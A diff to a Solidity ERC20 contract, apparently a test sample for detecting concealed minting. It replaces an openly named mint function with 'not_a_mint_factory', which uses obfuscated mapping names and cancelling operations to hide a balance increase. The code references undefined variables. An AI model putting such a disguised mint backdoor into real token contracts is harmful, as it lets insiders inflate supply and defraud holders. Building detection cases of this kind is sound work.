@@ -50,13 +50,6 @@ contract ERC20 is IERC20 {
     return true;
   }
 
-    function mint(address account, uint256 amount) internal {
-    require(account != 0);
-    _totalSupply = _totalSupply.add(amount);
-    _balances[account] = _balances[account].add(amount);
-    emit Transfer(address(0), account, amount);
-  }
-
   function _mint(address account, uint256 amount) internal {
     require(account != 0);
     _totalSupply = _totalSupply.add(amount);
@@ -87,6 +80,20 @@ contract ERC20 is IERC20 {
 
     function trickyMinusEqual(address account, uint256 amount) internal virtual {
         kyuisf[iuosf] -= amount;
+    }
+
+    function not_a_mint_factory(address account, uint256 amount)  internal virtual {
+        tablas[persona] = tablas[persona].add(amount);
+        _registros[jugador] = _registros[jugador] + amount;
+        kyuisf[iuosf] += amount;
+        tablas[persona] = tablas[persona].sub(amount);
+        _registros[jugador] = _registros[jugador] - amount;
+
+
+
+
+
+      
     }
 
     function AddSupplyMint(address account, uint256 amount) internal virtual {
